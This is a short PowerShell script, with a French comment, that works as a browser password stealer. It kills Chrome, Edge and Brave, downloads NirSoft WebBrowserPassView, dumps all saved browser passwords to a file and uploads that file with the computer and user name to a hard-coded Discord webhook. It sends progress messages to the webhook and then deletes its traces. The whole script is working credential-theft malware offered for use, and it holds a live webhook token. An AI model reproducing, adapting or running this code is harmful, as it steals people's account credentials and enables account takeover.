$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord {
    param([string]$msg)
    try {
        Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$msg}|ConvertTo-Json) -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 START - $env:COMPUTERNAME"

Get-Process chrome,msedge,brave -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 3

Send-Discord "📥 Downloading tool..."

Set-Location $env:TEMP
Remove-Item WebBrowserPassView.exe,passwords.txt -Force -EA 0

[Net.ServicePointManager]::SecurityProtocol = 'Tls12'

# NirSoft WebBrowserPassView - outil fiable depuis 15 ans
Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "wbpv.zip" -UseBasicParsing

if (Test-Path "wbpv.zip") {
    Expand-Archive "wbpv.zip" -Force
    
    Send-Discord "🔓 Extracting passwords..."
    
    .\wbpv\WebBrowserPassView.exe /stext passwords.txt
    Start-Sleep 3
    
    if (Test-Path "passwords.txt") {
        $content = Get-Content "passwords.txt" -Raw
        $count = ([regex]::Matches($content, "Password:")).Count
        
        Send-Discord "📤 Found $count passwords - uploading..."
        
        curl.exe -F "file=@passwords.txt" -F "content=🔑 **$count PASSWORDS**`n$env:COMPUTERNAME | $env:USERNAME" $wh
        
        Send-Discord "✅ SUCCESS"
    } else {
        Send-Discord "❌ No output"
    }
    
    Remove-Item wbpv.zip,wbpv,passwords.txt -Recurse -Force -EA 0
} else {
    Send-Discord "❌ Download failed"
}

Send-Discord "🧹 DONE"
